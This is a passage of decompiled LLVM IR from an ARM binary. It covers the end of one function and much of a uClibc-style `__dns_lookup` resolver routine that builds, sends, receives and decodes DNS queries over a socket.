  %v1_1520c = and i32 %v6_151d4, 32
  %v2_1520c = icmp eq i32 %v1_1520c, 0
  br i1 %v2_1520c, label %dec_label_pc_15254, label %dec_label_pc_15214

dec_label_pc_15214:                               ; preds = %dec_label_pc_1520c, %dec_label_pc_15200, %dec_label_pc_151f8
  %v0_1519825 = phi i32 [ %v1_15204, %dec_label_pc_1520c ], [ %v1_15204, %dec_label_pc_15200 ], [ %v1_151f8, %dec_label_pc_151f8 ]
  %v4_15214 = mul i32 %v1_15214, 256
  %v5_15214 = or i32 %v0_15214, %v4_15214
  %v1_15218 = add nuw nsw i32 %v0_15218, 1
  %v7_15220 = icmp slt i32 %v1_15218, 5
  br i1 %v7_15220, label %dec_label_pc_15190, label %dec_label_pc_15224

dec_label_pc_15190.lr.ph:                         ; preds = %entry
  %v2_15194.pre = load i32, i32* @global_var_224e8, align 4
  br label %dec_label_pc_15190

dec_label_pc_15224:                               ; preds = %dec_label_pc_15214
  %v2_15224 = icmp eq i32 %arg2, 0
  br i1 %v2_15224, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_15224
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.thread11

bb41:                                             ; preds = %dec_label_pc_15224
  %v3_15240 = call i32 @llvm.bswap.i32(i32 %v5_15214)
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_1524c = inttoptr i32 %arg2 to i32*
  store i32 %v3_15240, i32* %v3_1524c, align 4
  %v2_15250.pre = load i32, i32* %stack_var_-20, align 4
  %v17_15250.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb, %bb41
  %v17_15250 = phi i32 [ 1, %bb ], [ %v17_15250.pre, %bb41 ]
  %v2_15250 = phi i32 [ %v3_15178, %bb ], [ %v2_15250.pre, %bb41 ]
  store i32 %v2_15250, i32* @r4, align 4
  ret i32 %v17_15250

dec_label_pc_15254:                               ; preds = %dec_label_pc_151f0, %dec_label_pc_1520c, %dec_label_pc_15190, %dec_label_pc_151b0, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_15178, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_15194.pre, { 2, 1, 0 }
  uselistorder i32 %v1_15218, { 1, 0 }
  uselistorder i32 %v3_151c8, { 0, 2, 1 }
  uselistorder i32 %v0_15204, { 0, 1, 3, 2 }
  uselistorder i32 %v3_15178, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 6, 7, 8, 0, 1 }
  uselistorder label %dec_label_pc_15254, { 1, 0, 3, 2, 4 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_151c8, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp146 = call i32 @__decompiler_undefined_function_0()
  %tmp147 = call i32 @__decompiler_undefined_function_0()
  %tmp151 = call i32 @__decompiler_undefined_function_0()
  %tmp155 = call i32 @__decompiler_undefined_function_0()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %tmp157 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-100 = alloca i8, align 1
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-188 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %v3_15260 = load i32, i32* @r4, align 4
  %v6_15260 = load i32, i32* @r5, align 4
  %v9_15260 = load i32, i32* @r6, align 4
  %v12_15260 = load i32, i32* @r7, align 4
  %v15_15260 = load i32, i32* @r8, align 4
  %v18_15260 = load i32, i32* @sb, align 4
  %v21_15260 = load i32, i32* @sl, align 4
  store i32 %arg6, i32* @r8, align 4
  %v1_15280 = call i32 @malloc(i32 512)
  store i32 %v1_15280, i32* @r7, align 4
  %v1_1528c = call i32 @malloc(i32 1025)
  %v2_15290 = icmp eq i32 %v1_1528c, 0
  br i1 %v2_15290, label %.thread8, label %bb

bb:                                               ; preds = %entry
  %v1_15294 = load i32, i32* @r7, align 4
  %v3_15294 = icmp eq i32 %v1_15294, 0
  store i32 %v1_1528c, i32* %stack_var_-236, align 4
  br i1 %v3_15294, label %bb195, label %dec_label_pc_152a8

.thread8:                                         ; preds = %entry
  store i32 0, i32* %stack_var_-236, align 4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_15988

bb195:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_15988

dec_label_pc_152a8:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v2_152ac = icmp eq i32 %arg3, 0
  br i1 %v2_152ac, label %dec_label_pc_15988, label %dec_label_pc_152b4

dec_label_pc_152b4:                               ; preds = %dec_label_pc_152a8
  %v2_152b8 = load i8, i8* %arg1, align 1
  %v2_152bc = icmp eq i8 %v2_152b8, 0
  br i1 %v2_152bc, label %dec_label_pc_15988, label %dec_label_pc_152c4

dec_label_pc_152c4:                               ; preds = %dec_label_pc_152b4
  %v3_152c8 = call i32 @strlen(i8* nonnull %arg1)
  %v2_152d0 = add i32 %v3_152c8, %tmp
  %v1_152d4 = add i32 %v2_152d0, -1
  %v2_152d4 = inttoptr i32 %v1_152d4 to i8*
  %v3_152d4 = load i8, i8* %v2_152d4, align 1
  %v2_152d8 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_152d8, i32* @r4, align 4
  %v7_152dc = icmp eq i8 %v3_152d4, 46
  %. = zext i1 %v7_152dc to i32
  store i32 %v2_152d8, i32* @r0, align 4
  %v1_15300 = call i32 @__pthread_return_void()
  %v1_15310 = call i32 @__pthread_return_0()
  %v2_1531c = load i32, i32* @global_var_28adc.585, align 4
  %v2_15320 = srem i32 %v2_1531c, %arg3
  %v3_15328 = load i8, i8* @global_var_22829.588, align 1
  %v4_15328 = zext i8 %v3_15328 to i32
  %v2_1532c = load i8, i8* bitcast (i8** @global_var_22828.587 to i8*), align 4
  %v3_1532c = zext i8 %v2_1532c to i32
  %v4_15334 = mul nuw nsw i32 %v4_15328, 256
  %v5_15334 = or i32 %v3_1532c, %v4_15334
  store i32 %v5_15334, i32* @sb, align 4
  store i32 %v2_15320, i32* @sl, align 4
  store i32 %v2_152d8, i32* @r0, align 4
  %v1_15348 = call i32 @__pthread_return_void()
  %v0_15354 = load i32, i32* @r5, align 4
  %v2_15374 = ptrtoint i8* %stack_var_-188 to i32
  %v6_153b8 = bitcast i8* %stack_var_-188 to i32*
  %v2_15498 = ptrtoint i32* %stack_var_-92 to i32
  %v3_15530 = bitcast i8* %stack_var_-100 to %sockaddr*
  %v10_15594 = bitcast i32* %stack_var_-44 to %pollfd*
  %v2_158e0 = icmp eq i1 %v7_152dc, false
  %v7_155e8 = icmp eq i32 %tmp156, 3
  %tmp198 = icmp slt i32 %tmp155, 1
  %v2_156cc = ptrtoint i32* %stack_var_-140 to i32
  %v9_157c4 = icmp eq i32 %tmp147, %arg2
  %v7_15758 = icmp eq i32 %arg2, 1
  %v2_15700 = icmp eq i32 %tmp151, 0
  %tmp292 = icmp ult i32 %v0_15354, 3
  br i1 %tmp292, label %dec_label_pc_1535c.lr.ph.preheader.lr.ph, label %dec_label_pc_15994

dec_label_pc_1535c.lr.ph.preheader.lr.ph:         ; preds = %dec_label_pc_152c4
  %v2_1566c = icmp eq i32 %tmp156, 0
  %v8_1575c = icmp eq i32 %arg2, 28
  br label %dec_label_pc_1535c.lr.ph.preheader

dec_label_pc_1535c:                               ; preds = %dec_label_pc_1535c.lr.ph, %dec_label_pc_15978.backedge
  %v1_15364 = phi i32 [ %stack_var_-216.1.ph84, %dec_label_pc_1535c.lr.ph ], [ %v0_1550c, %dec_label_pc_15978.backedge ]
  %stack_var_-208.567 = phi i32 [ %stack_var_-208.5.ph83, %dec_label_pc_1535c.lr.ph ], [ %stack_var_-208.5.be, %dec_label_pc_15978.backedge ]
  %v7_15360 = icmp eq i32 %v1_15364, -1
  br i1 %v7_15360, label %bb200, label %bb199

bb199:                                            ; preds = %dec_label_pc_1535c
  br label %bb200

bb200:                                            ; preds = %dec_label_pc_1535c, %bb199
  %v1_15368 = xor i1 %v7_15360, true
  call void @__pseudo_cond_branch(i1 %v1_15368, i32 ptrtoint (i32* @global_var_f618.590 to i32))
  store i32 512, i32* @r2, align 4
  store i32 %v2_15374, i32* @r4, align 4
  %v0_15378 = load i32, i32* @r7, align 4
  %v2_1537c = inttoptr i32 %v0_15378 to i8*
  %v3_1537c = call i32 @__GI_memset(i8* %v2_1537c, i32 0)
  store i32 48, i32* @r2, align 4
  %v3_1538c = call i32 @__GI_memset(i8* nonnull %stack_var_-188, i32 0)
  %v0_15390 = load i32, i32* @sb, align 4
  %v1_15390 = add i32 %v0_15390, 1
  %v3_15398 = urem i32 %v1_15390, 65536
  store i32 %v3_15398, i32* @sb, align 4
  %v0_153a4 = load i32, i32* @r7, align 4
  %v5_153b0 = trunc i32 %v1_15390 to i8
  store i8 %v5_153b0, i8* %stack_var_-188, align 1
  %v7_153b8 = call i32 @__encode_header(i32* %v6_153b8, i32 %v0_153a4, i32 512, i32 1, i32 %v1_15390)
  store i32 %v7_153b8, i32* @r5, align 4
  %v1_153bc = icmp slt i32 %v7_153b8, 0
  br i1 %v1_153bc, label %dec_label_pc_15994, label %dec_label_pc_153c4

dec_label_pc_153c4:                               ; preds = %bb200
  store i32 %tmp, i32* @r1, align 4
  %v2_153cc = load i32, i32* %stack_var_-236, align 4
  %v4_153d0 = call i32 @strncpy(i32 %v2_153cc, i32 %tmp, i32 1025)
  store i32 %v2_152d8, i32* @r0, align 4
  %v1_153e8 = call i32 @__pthread_return_void()
  %v1_153f8 = call i32 @__pthread_return_0()
  %v1_15408 = load i32, i32* @sl, align 4
  %v4_15408 = mul i32 %v1_15408, 4
  %v5_15408 = add i32 %v4_15408, %arg4
  %v6_15408 = inttoptr i32 %v5_15408 to i32*
  %v7_15408 = load i32, i32* %v6_15408, align 4
  store i32 %v7_15408, i32* @r6, align 4
  br i1 %v1_15404, label %dec_label_pc_1544c, label %dec_label_pc_15410

dec_label_pc_15410:                               ; preds = %dec_label_pc_153c4
  %v2_15418 = load i32, i32* @global_var_28bac.593, align 4
  %v6_15420 = icmp slt i32 %v6_1593c, %v2_15418
  br i1 %v6_15420, label %dec_label_pc_15424, label %dec_label_pc_1544c

dec_label_pc_15424:                               ; preds = %dec_label_pc_15410
  store i32 ptrtoint (i32* @global_var_1a298.595 to i32), i32* @r1, align 4
  %v2_1542c = load i32, i32* %stack_var_-236, align 4
  %v4_15430 = inttoptr i32 %v2_1542c to i8*
  %v5_15430 = call i32 @__GI_strncat(i8* %v4_15430, i32 ptrtoint (i32* @global_var_1a298.595 to i32), i32 1025, i32 %v2_15418)
  %v7_15440 = load i32, i32* %v6_15440, align 4
  store i32 %v7_15440, i32* @r1, align 4
  %v4_15448 = inttoptr i32 %v2_1542c to i8*
  %v5_15448 = call i32 @__GI_strncat(i8* %v4_15448, i32 %v7_15440, i32 1025, i32 ptrtoint (i32* @global_var_28b8c.597 to i32))
  br label %dec_label_pc_1544c

dec_label_pc_1544c:                               ; preds = %dec_label_pc_15410, %dec_label_pc_153c4, %dec_label_pc_15424
  store i32 %v2_152d8, i32* @r0, align 4
  store i32 87136, i32* @lr, align 4
  %v1_1545c = call i32 @__pthread_return_void()
  %v2_15468 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_15468, i32* %stack_var_-56, align 4
  %v0_15478 = load i32, i32* @r7, align 4
  %v1_15478 = load i32, i32* @r5, align 4
  %v2_15478 = add i32 %v1_15478, %v0_15478
  %v1_1547c = sub i32 512, %v1_15478
  %v8_15484 = call i32 @__encode_question(i32* nonnull %stack_var_-56, i32 %v2_15478, i32 %v1_1547c, i32 %arg2, i32 %v2_15468, i32 %arg2, i32 1)
  store i32 %v8_15484, i32* @fp, align 4
  %v1_15488 = icmp slt i32 %v8_15484, 0
  br i1 %v1_15488, label %dec_label_pc_15994, label %dec_label_pc_15490

dec_label_pc_15490:                               ; preds = %dec_label_pc_1544c
  store i32 0, i32* @r4, align 4
  %v0_154a0 = load i32, i32* @r6, align 4
  store i8 2, i8* %stack_var_-100, align 1
  %v3_154ac = inttoptr i32 %v0_154a0 to i8*
  %v4_154ac = call i32 @inet_pton(i32 10, i8* %v3_154ac, i32 %v2_15498)
  %v1_154b0 = load i32, i32* @r4, align 4
  %v7_154b4 = icmp sgt i32 %v4_154ac, %v1_154b0
  br i1 %v7_154b4, label %bb201, label %dec_label_pc_15490..thread11_crit_edge

dec_label_pc_15490..thread11_crit_edge:           ; preds = %dec_label_pc_15490
  %v3_154c0.pre = load i8, i8* %stack_var_-100, align 1
  br label %.thread11

bb201:                                            ; preds = %dec_label_pc_15490
  store i8 10, i8* %stack_var_-100, align 1
  br label %.thread11

.thread11:                                        ; preds = %dec_label_pc_15490..thread11_crit_edge, %bb201
  %v3_154c0 = phi i8 [ %v3_154c0.pre, %dec_label_pc_15490..thread11_crit_edge ], [ 10, %bb201 ]
  %v4_154c0 = sext i8 %v3_154c0 to i32
  %v8_154bc.op = urem i32 %v1_154b0, 256
  %v8_154bc.op.op = mul nuw nsw i32 %v8_154bc.op, 256
  %v4_154c8 = select i1 %v7_154b4, i32 %v8_154bc.op.op, i32 0
  %v5_154c8 = or i32 %v4_154c0, %v4_154c8
  %v7_154cc = icmp eq i32 %v5_154c8, 10
  br i1 %v7_154cc, label %dec_label_pc_154f8, label %dec_label_pc_154e0

dec_label_pc_154e0:                               ; preds = %.thread11
  %v0_154e4 = load i32, i32* @r6, align 4
  store i32 %v0_154e4, i32* @r0, align 4
  %v1_154f0 = call i32 @inet_addr(i32 %v0_154e4)
  br label %dec_label_pc_154f8

dec_label_pc_154f8:                               ; preds = %.thread11, %dec_label_pc_154e0
  %v0_1550c = call i32 @socket()
  %v1_15510 = icmp slt i32 %v0_1550c, 0
  br i1 %v1_15510, label %.thread, label %dec_label_pc_15528

.thread:                                          ; preds = %dec_label_pc_154f8
  br label %dec_label_pc_15978.backedge

dec_label_pc_15978.backedge:                      ; preds = %.thread, %.thread13
  %stack_var_-208.5.be = add i32 %stack_var_-208.567, 1
  %tmp293 = icmp ult i32 %stack_var_-208.5.be, 3
  br i1 %tmp293, label %dec_label_pc_1535c, label %dec_label_pc_15994

dec_label_pc_15528:                               ; preds = %dec_label_pc_154f8
  %v4_15530 = call i32 @__libc_connect(i32 %v0_1550c, %sockaddr* nonnull %v3_15530, i32 28)
  %v1_15534 = icmp slt i32 %v4_15530, 0
  br i1 %v1_15534, label %dec_label_pc_1553c, label %dec_label_pc_1555c

dec_label_pc_1553c:                               ; preds = %dec_label_pc_15528
  %v0_1553c = call i32 @__errno_location()
  %v1_15540 = inttoptr i32 %v0_1553c to i32*
  %v2_15540 = load i32, i32* %v1_15540, align 4
  %v7_15544 = icmp eq i32 %v2_15540, 101
  br i1 %v7_15544, label %dec_label_pc_158a8, label %.thread13

.thread13:                                        ; preds = %dec_label_pc_1553c
  br label %dec_label_pc_15978.backedge

dec_label_pc_1555c:                               ; preds = %dec_label_pc_15528
  %v0_1555c = load i32, i32* @r5, align 4
  %v1_1555c = load i32, i32* @fp, align 4
  %v2_1555c = add i32 %v1_1555c, %v0_1555c
  %v0_15560 = load i32, i32* @r7, align 4
  %v4_1556c = inttoptr i32 %v0_15560 to i32*
  %v5_1556c = call i32 @__libc_send(i32 %v0_1550c, i32* %v4_1556c, i32 %v2_1555c, i32 0)
  store i32 0, i32* @r4, align 4
  store i32 %v0_1550c, i32* %stack_var_-44, align 4
  %v11_15594 = call i32 @__libc_poll(%pollfd* %v10_15594, i32 1, i32 10000, i32 1, i32 %v0_1550c, i32 1, i32 0)
  %v1_15598 = load i32, i32* @r4, align 4
  %v7_1559c = icmp sgt i32 %v11_15594, %v1_15598
  br i1 %v7_1559c, label %dec_label_pc_155a0, label %dec_label_pc_158a8

dec_label_pc_155a0:                               ; preds = %dec_label_pc_1555c
  %v0_155a8 = load i32, i32* @r7, align 4
  %v5_155b0 = inttoptr i32 %v0_155a8 to i32*
  %v6_155b0 = call i32 @__libc_recv(i32 %v0_1550c, i32* %v5_155b0, i32 512, i32 %v1_15598, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_155b0, i32* @fp, align 4
  %v7_155bc = icmp slt i32 %v6_155b0, 12
  br i1 %v7_155bc, label %dec_label_pc_158dc, label %dec_label_pc_155c0

dec_label_pc_155c0:                               ; preds = %dec_label_pc_155a0
  %v0_155c0 = load i32, i32* @r7, align 4
  %v2_155c8 = inttoptr i32 %v0_155c0 to i8*
  %v3_155c8 = call i32 @__decode_header(i8* %v2_155c8, i32 %v2_15374)
  %v3_155cc = load i8, i8* %stack_var_-188, align 1
  %v4_155cc = sext i8 %v3_155cc to i32
  store i32 %v4_155cc, i32* @r6, align 4
  %v1_155d0 = load i32, i32* @sb, align 4
  %v9_155d0 = icmp eq i32 %v4_155cc, %v1_155d0
  br i1 %v9_155d0, label %dec_label_pc_155d8, label %dec_label_pc_158dc

dec_label_pc_155d8:                               ; preds = %dec_label_pc_155c0
  %v1_155dc = load i32, i32* @r4, align 4
  %v9_155dc = icmp eq i32 %tmp157, %v1_155dc
  br i1 %v9_155dc, label %dec_label_pc_158dc, label %dec_label_pc_155e4

dec_label_pc_155e4:                               ; preds = %dec_label_pc_155d8
  br i1 %v7_155e8, label %dec_label_pc_155f0, label %dec_label_pc_1566c

dec_label_pc_155f0:                               ; preds = %dec_label_pc_155e4
  %v9_155f4 = icmp eq i32 %., %v1_155dc
  br i1 %v9_155f4, label %dec_label_pc_155fc, label %dec_label_pc_15660

dec_label_pc_155fc:                               ; preds = %dec_label_pc_155f0
  store i32 %v2_152d8, i32* @r5, align 4
  store i32 %v2_152d8, i32* @r0, align 4
  %v1_15614 = call i32 @__pthread_return_void()
  %v1_15624 = call i32 @__pthread_return_0()
  store i32 %v2_152d8, i32* @r0, align 4
  %v2_15630 = load i32, i32* @global_var_28bac.593, align 4
  %v1_15640 = call i32 @__pthread_return_void()
  %v1_15648 = add i32 %v2_15630, -1
  store i32 %v1_15648, i32* @r4, align 4
  %v5_15650 = icmp slt i32 %v6_1593c, %v1_15648
  br i1 %v5_15650, label %.thread19, label %dec_label_pc_15660

.thread19:                                        ; preds = %dec_label_pc_155fc
  %v7_15650 = add i32 %v6_1593c, 1
  %v6_15654 = load i32, i32* @r6, align 4
  store i32 %v6_15654, i32* @sb, align 4
  br label %dec_label_pc_15978.outer.backedge

dec_label_pc_15660:                               ; preds = %dec_label_pc_155fc, %dec_label_pc_155f0
  %v0_15660 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_15690

dec_label_pc_1566c:                               ; preds = %dec_label_pc_155e4
  br i1 %v2_1566c, label %dec_label_pc_15674, label %dec_label_pc_158dc

dec_label_pc_15674:                               ; preds = %dec_label_pc_1566c
  br i1 %tmp198, label %dec_label_pc_15688, label %dec_label_pc_156a0.preheader

dec_label_pc_156a0.preheader:                     ; preds = %dec_label_pc_15674
  store i32 12, i32* @r5, align 4
  br label %dec_label_pc_156a0

dec_label_pc_15688:                               ; preds = %dec_label_pc_15674
  %v0_15688 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_15690

dec_label_pc_15690:                               ; preds = %dec_label_pc_15660, %dec_label_pc_15688
  %storemerge4 = phi i32 [ %v0_15688, %dec_label_pc_15688 ], [ %v0_15660, %dec_label_pc_15660 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_15688 ], [ 1, %dec_label_pc_15660 ]
  %v2_15690 = inttoptr i32 %storemerge4 to i32*
  store i32 %storemerge, i32* %v2_15690, align 4
  br label %dec_label_pc_159a4

dec_label_pc_15698:                               ; preds = %dec_label_pc_156a0
  %v2_15698 = call i32 @__length_question(i32 %v0_156ac, i32 %v0_156a8)
  %v0_1569c = load i32, i32* @r5, align 4
  %v2_1569c = add i32 %v0_1569c, %v2_15698
  store i32 %v2_1569c, i32* @r5, align 4
  %v0_156a4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_156a0

dec_label_pc_156a0:                               ; preds = %dec_label_pc_156a0.preheader, %dec_label_pc_15698
  %v0_156a8 = phi i32 [ 12, %dec_label_pc_156a0.preheader ], [ %v2_1569c, %dec_label_pc_15698 ]
  %v0_156b0 = phi i32 [ 0, %dec_label_pc_156a0.preheader ], [ %v0_156a4.pre, %dec_label_pc_15698 ]
  store i32 %v0_156a8, i32* @r1, align 4
  %v0_156ac = load i32, i32* @r7, align 4
  store i32 %v0_156ac, i32* @r0, align 4
  %v1_156b0 = add i32 %v0_156b0, 1
  store i32 %v1_156b0, i32* @r4, align 4
  %v5_156b4 = icmp slt i32 %v0_156b0, 1
  br i1 %v5_156b4, label %dec_label_pc_15698, label %dec_label_pc_156b8

dec_label_pc_156b8:                               ; preds = %dec_label_pc_156a0
  br label %dec_label_pc_15814

dec_label_pc_156cc:                               ; preds = %bb205
  store i32 %v2_156cc, i32* @r4, align 4
  %v0_156d0 = load i32, i32* @r7, align 4
  %v0_156d8 = load i32, i32* @fp, align 4
  %v5_156e0 = call i32 @__decode_answer(i32 %v0_156d0, i32 %v0_156d4, i32 %v0_156d8, i32* nonnull %stack_var_-140)
  %v1_156e4 = icmp slt i32 %v5_156e0, 0
  br i1 %v1_156e4, label %dec_label_pc_156f0, label %dec_label_pc_1570c

dec_label_pc_156f0:                               ; preds = %dec_label_pc_156cc
  %v2_156f4 = icmp eq i32 %stack_var_-192.0, 0
  br i1 %v2_156f4, label %dec_label_pc_158dc, label %dec_label_pc_156fc

dec_label_pc_156fc:                               ; preds = %dec_label_pc_156f0
  br i1 %v2_15700, label %dec_label_pc_158dc, label %dec_label_pc_15828

dec_label_pc_1570c:                               ; preds = %dec_label_pc_156cc
  %v2_15710 = icmp eq i32 %stack_var_-212.2, 0
  br i1 %v2_15710, label %dec_label_pc_157b4, label %dec_label_pc_15718

dec_label_pc_15718:                               ; preds = %dec_label_pc_1570c
  %v0_15718 = load i32, i32* @r8, align 4
  %v3_1571c = add i32 %v0_15718, 32
  %v4_1571c = inttoptr i32 %v3_1571c to i32*
  %v5_1571c = load i32, i32* %v4_1571c, align 4
  store i32 %v5_1571c, i32* @ip, align 4
  %v6_1571c = add i32 %v0_15718, 36
  %v7_1571c = inttoptr i32 %v6_1571c to i32*
  %v8_1571c = load i32, i32* %v7_1571c, align 4
  store i32 %v8_1571c, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v2_156cc, i32* @r1, align 4
  store i32 %v0_15718, i32* @r0, align 4
  %v0_15738 = call i32 @memcpy()
  %v0_1573c = load i32, i32* @r8, align 4
  %v1_1573c = add i32 %v0_1573c, 4
  %v2_1573c = inttoptr i32 %v1_1573c to i32*
  %v3_1573c = load i32, i32* %v2_1573c, align 4
  %v7_15740 = icmp eq i32 %v3_1573c, 24
  br i1 %v7_15740, label %dec_label_pc_15764, label %dec_label_pc_15748

dec_label_pc_15748:                               ; preds = %dec_label_pc_15718
  %v1_15748 = add i32 %v0_1573c, 28
  %v2_15748 = inttoptr i32 %v1_15748 to i32*
  %v3_15748 = load i32, i32* %v2_15748, align 4
  %v2_1574c = icmp eq i32 %v3_15748, 0
  br i1 %v2_1574c, label %dec_label_pc_15828, label %dec_label_pc_15754

dec_label_pc_15754:                               ; preds = %dec_label_pc_15748
  br i1 %v7_15758, label %dec_label_pc_15764, label %bb203

bb203:                                            ; preds = %dec_label_pc_15754
  br i1 %v8_1575c, label %dec_label_pc_15764, label %dec_label_pc_15828

dec_label_pc_15764:                               ; preds = %dec_label_pc_15754, %bb203, %dec_label_pc_15718
  %v9_15768 = icmp eq i32 %v3_1573c, %arg2
  br i1 %v9_15768, label %dec_label_pc_1577c, label %dec_label_pc_15770

dec_label_pc_15770:                               ; preds = %dec_label_pc_15764
  %v1_15770 = inttoptr i32 %v0_1573c to i32*
  %v2_15770 = load i32, i32* %v1_15770, align 4
  store i32 %v2_15770, i32* @r0, align 4
  %v0_15774 = call i32 @free()
  br label %dec_label_pc_15800

dec_label_pc_1577c:                               ; preds = %dec_label_pc_15764
  %v1_15784 = add i32 %v0_1573c, 16
  %v2_15784 = inttoptr i32 %v1_15784 to i32*
  %v3_15784 = load i32, i32* %v2_15784, align 4
  %v2_15788 = sub i32 %tmp155, %stack_var_-192.0
  %v1_1578c = add i32 %v2_15788, -1
  %v1_15790 = add i32 %v3_15784, 4
  %v2_15794 = mul i32 %v1_15790, %v1_1578c
  %v1_15798 = add i32 %v0_1573c, 32
  %v2_15798 = inttoptr i32 %v1_15798 to i32*
  %v3_15798 = load i32, i32* %v2_15798, align 4
  %v2_157a0 = add i32 %v0_1573c, 36
  %v3_157a0 = inttoptr i32 %v2_157a0 to i32*
  store i32 %v1_1578c, i32* %v3_157a0, align 4
  %tmp294 = icmp ugt i32 %v2_15794, %v3_15798
  br i1 %tmp294, label %dec_label_pc_15828, label %dec_label_pc_1577c.dec_label_pc_157fc_crit_edge

dec_label_pc_1577c.dec_label_pc_157fc_crit_edge:  ; preds = %dec_label_pc_1577c
  %v1_157fc.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_157fc

dec_label_pc_157b4:                               ; preds = %dec_label_pc_1570c
  %v3_157b4 = load i32, i32* %stack_var_-140, align 4
  store i32 %v3_157b4, i32* @r0, align 4
  %v0_157b8 = call i32 @free()
  br i1 %v9_157c4, label %dec_label_pc_157cc, label %dec_label_pc_15800

dec_label_pc_157cc:                               ; preds = %dec_label_pc_157b4
  %v0_157cc = load i32, i32* @r8, align 4
  %v1_157cc = add i32 %v0_157cc, 16
  %v2_157cc = inttoptr i32 %v1_157cc to i32*
  %v3_157cc = load i32, i32* %v2_157cc, align 4
  %v9_157d4 = icmp eq i32 %v3_157cc, %tmp146
  br i1 %v9_157d4, label %dec_label_pc_157dc, label %dec_label_pc_158d4

dec_label_pc_157dc:                               ; preds = %dec_label_pc_157cc
  %v1_157dc = add i32 %v0_157cc, 36
  %v2_157dc = inttoptr i32 %v1_157dc to i32*
  %v3_157dc = load i32, i32* %v2_157dc, align 4
  %v1_157e0 = add i32 %v0_157cc, 28
  %v2_157e0 = inttoptr i32 %v1_157e0 to i32*
  %v3_157e0 = load i32, i32* %v2_157e0, align 4
  %v3_157e4 = mul i32 %v3_157dc, %tmp146
  %v4_157e4 = add i32 %v3_157e0, %v3_157e4
  store i32 %v4_157e4, i32* @r0, align 4
  store i32 %tmp146, i32* @r2, align 4
  %v0_157f0 = call i32 @memcpy()
  %v0_157f4 = load i32, i32* @r8, align 4
  %v1_157f4 = add i32 %v0_157f4, 36
  %v2_157f4 = inttoptr i32 %v1_157f4 to i32*
  %v3_157f4 = load i32, i32* %v2_157f4, align 4
  %v1_157f8 = add i32 %v3_157f4, 1
  br label %dec_label_pc_157fc

dec_label_pc_157fc:                               ; preds = %dec_label_pc_1577c.dec_label_pc_157fc_crit_edge, %dec_label_pc_157dc
  %v1_157fc = phi i32 [ %v0_157f4, %dec_label_pc_157dc ], [ %v1_157fc.pre, %dec_label_pc_1577c.dec_label_pc_157fc_crit_edge ]
  %storemerge5 = phi i32 [ %v1_157f8, %dec_label_pc_157dc ], [ 0, %dec_label_pc_1577c.dec_label_pc_157fc_crit_edge ]
  %v2_157fc = add i32 %v1_157fc, 36
  %v3_157fc = inttoptr i32 %v2_157fc to i32*
  store i32 %storemerge5, i32* %v3_157fc, align 4
  br label %dec_label_pc_15800

dec_label_pc_15800:                               ; preds = %dec_label_pc_157b4, %dec_label_pc_15770, %dec_label_pc_157fc
  %stack_var_-212.1 = phi i32 [ 0, %dec_label_pc_157fc ], [ 0, %dec_label_pc_157b4 ], [ %stack_var_-212.2, %dec_label_pc_15770 ]
  %v1_15808 = add i32 %stack_var_-192.0, 1
  %v0_15810 = load i32, i32* @r5, align 4
  %v2_15810 = add i32 %v0_15810, %v5_156e0
  store i32 %v2_15810, i32* @r5, align 4
  br label %dec_label_pc_15814

dec_label_pc_15814:                               ; preds = %dec_label_pc_156b8, %dec_label_pc_15800
  %v0_156d4 = phi i32 [ %v0_156a8, %dec_label_pc_156b8 ], [ %v2_15810, %dec_label_pc_15800 ]
  %stack_var_-212.2 = phi i32 [ 1, %dec_label_pc_156b8 ], [ %stack_var_-212.1, %dec_label_pc_15800 ]
  %stack_var_-192.0 = phi i32 [ 0, %dec_label_pc_156b8 ], [ %v1_15808, %dec_label_pc_15800 ]
  %v2_1581c = sub i32 %stack_var_-192.0, %tmp155
  %v4_1581c = xor i32 %stack_var_-192.0, %tmp155
  %v5_1581c = xor i32 %v2_1581c, %stack_var_-192.0
  %v6_1581c = and i32 %v5_1581c, %v4_1581c
  %v5_15820 = icmp slt i32 %stack_var_-192.0, %tmp155
  br i1 %v5_15820, label %bb204, label %bb205

bb204:                                            ; preds = %dec_label_pc_15814
  %v7_15820 = load i32, i32* @fp, align 4
  %v8_15820 = sub i32 %v0_156d4, %v7_15820
  %v10_15820 = xor i32 %v7_15820, %v0_156d4
  %v11_15820 = xor i32 %v8_15820, %v0_156d4
  %v12_15820 = and i32 %v11_15820, %v10_15820
  br label %bb205

bb205:                                            ; preds = %dec_label_pc_15814, %bb204
  %v1_15824.in = phi i32 [ %v6_1581c, %dec_label_pc_15814 ], [ %v12_15820, %bb204 ]
  %v0_15824.in = phi i32 [ %v2_1581c, %dec_label_pc_15814 ], [ %v8_15820, %bb204 ]
  %v0_15824 = icmp slt i32 %v0_15824.in, 0
